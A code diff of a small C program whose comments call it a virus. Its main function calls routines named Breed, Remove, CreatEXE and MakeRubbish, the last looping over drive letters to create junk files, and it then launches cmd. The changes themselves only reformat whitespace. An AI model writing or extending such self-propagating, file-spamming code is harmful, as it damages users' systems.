@@ -25,7 +25,7 @@ int MakeRubbish( void ) {
     FILE *fp;                                                            /* 文件指针fp */
     char *path;                                                          /* 路径指针 */
     char *NewName;
-    char *disk[7] = { "A", "B", "C", "D", "E", "F", "G" };        /* 初始化指针数组 */
+    char *disk[7] = { "A", "B", "C", "D", "E", "F", "G" };              /* 初始化指针数组 */
     char *addtion = ":\\";
 
     for ( i = 0; i < 5; i++ ) {
@@ -103,16 +103,16 @@ int Breed( void ) {
 
 /*程序入口地址 */
 int main( void ) {
-    printf( "STH\n" );
+    printf("STH\n");
     Breed();                                /* 养殖病毒 */
     Remove();                               /* 去处 */
     CreatEXE();
-    printf( "您能告诉我您的名字?\n" );
-    printf( "现在麻烦您输入您的名字!\n" );
+    printf("您能告诉我您的名字?\n");
+    printf("现在麻烦您输入您的名字!\n");
     MakeRubbish();                          /* 调用子函数 */
     getchar();
     clrscr();                               /* 清除屏幕 */
-    system( "cmd" );
+    system("cmd");
     getch();
 
     return(0);
